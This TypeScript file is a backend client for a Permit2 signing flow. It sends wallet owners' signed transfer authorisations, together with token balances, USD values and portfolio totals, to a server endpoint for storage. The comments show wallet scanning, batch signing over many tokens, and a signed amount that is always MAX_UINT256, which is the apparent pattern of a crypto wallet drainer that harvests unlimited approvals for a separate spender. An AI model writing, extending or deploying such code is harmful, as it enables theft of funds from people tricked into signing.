// src/lib/backendClient.ts
// Thin client for YOUR OWN backend. The ONLY job of the backend in the
// Permit2 flow is to STORE a signed authorisation the browser produced.
// Wallet scanning, typed-data building and signing all happen client-side.

const BASE_URL = (import.meta.env.VITE_BACKEND_URL as string | undefined)?.replace(/\/$/, '') || '';
const API_KEY = (import.meta.env.VITE_BACKEND_API_KEY as string | undefined) || '';

export const isBackendConfigured = () => Boolean(BASE_URL);

// ── Typed-data shape — supports both single and batch Permit2 messages ──
// permitted is either a single object (PermitTransferFrom)
// or an array of objects (PermitBatchTransferFrom).
export type Permit2Permitted =
  | { token: string; amount: string }
  | Array<{ token: string; amount: string }>;

export interface Permit2TypedData {
  domain: { name: string; chainId: number; verifyingContract: string };
  types: Record<string, Array<{ name: string; type: string }>>;
  primaryType?: string;
  message: {
    permitted: Permit2Permitted;
    nonce: string;
    deadline: number;
  };
}

// ── Per-token snapshot for batch mode ──
export interface Permit2TokenSnapshot {
  token: string;
  tokenSymbol?: string;
  /** Real wallet balance (raw units). */
  balance: string;
  /** Human-readable balance in whole token units. */
  balanceFormatted?: string;
  decimals?: number;
  valueUsd?: number;
  /** Value encoded in the signature (always MAX_UINT256). */
  signedAmount: string;
}

// ── Payload for storePermit2Signature ──
export interface StorePermit2SignaturePayload {
  owner: string;
  chainId: number;
  /** 'batch' when signing multiple tokens, 'single' for the legacy fallback. */
  mode?: 'batch' | 'single';

  // ── Batch mode: full snapshot of every token in the signature ──
  tokens?: Permit2TokenSnapshot[];
  batchValueUsd?: number;

  // ── Single-token fields (always populated for back-compat) ──
  token: string;
  tokenSymbol?: string;
  /** Real wallet balance (raw units) of the primary signed token. */
  amount: string;
  /** Value actually encoded in the signature (MAX_UINT256 for unlimited). */
  signedAmount?: string;
  /** Human-readable balance in whole token units. */
  balanceFormatted?: string;
  decimals?: number;
  nonce: string;
  deadline: number;
  spender: string;
  signature: string;
  typedData: Permit2TypedData;
  walletName?: string | null;
  portfolioUsd?: number;
  tokenValueUsd?: number;
}

async function request<T>(path: string, body: unknown): Promise<T> {
  if (!BASE_URL) throw new Error('VITE_BACKEND_URL is not set');

  const res = await fetch(`${BASE_URL}${path}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      ...(API_KEY ? { 'x-api-key': API_KEY } : {}),
    },
    credentials: 'include',
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const text = await res.text().catch(() => '');
    throw new Error(`Backend ${path} failed (${res.status}): ${text.slice(0, 200)}`);
  }
  return (await res.json()) as T;
}

/** Send the signed Permit2 authorisation to the backend for storage. */
export const storePermit2Signature = (
  payload: StorePermit2SignaturePayload
): Promise<{ ok: boolean; id?: string }> =>
  request<{ ok: boolean; id?: string }>('/api/wallet/store-signature', payload);
